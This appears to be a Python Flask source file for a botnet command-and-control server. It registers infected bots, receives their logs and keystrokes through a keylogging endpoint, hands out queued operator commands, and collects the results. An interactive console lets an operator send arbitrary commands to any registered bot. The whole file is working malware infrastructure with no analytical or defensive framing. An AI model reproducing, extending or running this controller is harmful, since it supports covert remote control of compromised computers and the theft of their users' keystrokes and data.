from flask import Flask, request
import threading

app = Flask(__name__)

# In-memory command store per bot
commands = {}

@app.route("/register", methods=["POST"])
def register():
    bot_id = request.form.get("id")
    print(f"[+] New bot: {bot_id}")
    commands[bot_id] = []
    return "OK"

@app.route("/log", methods=["POST"])
def log():
    data = request.form.to_dict()
    print(f"[LOG] {data}")
    return "Logged"

@app.route("/key", methods=["POST"])
def keylog():
    key = request.form.get("key")
    print(f"[KEYLOG] {key}")
    return "OK"

@app.route("/task", methods=["GET"])
def get_task():
    bot_id = request.args.get("id")
    if bot_id in commands and commands[bot_id]:
        return commands[bot_id].pop(0)
    return "NONE"

@app.route("/result", methods=["POST"])
def result():
    bot_id = request.form.get("id")
    output = request.form.get("output")
    print(f"[RESULT from {bot_id}]:\n{output}")
    return "OK"

# Operator console for sending commands
def operator():
    while True:
        bot_id = input("\nTarget bot ID: ")
        cmd = input("Command to send: ")
        if bot_id not in commands:
            print("[!] No such bot registered.")
            continue
        commands[bot_id].append(cmd)

# Start server + operator thread
if __name__ == "__main__":
    threading.Thread(target=operator, daemon=True).start()
    app.run(host="0.0.0.0", port=8000)
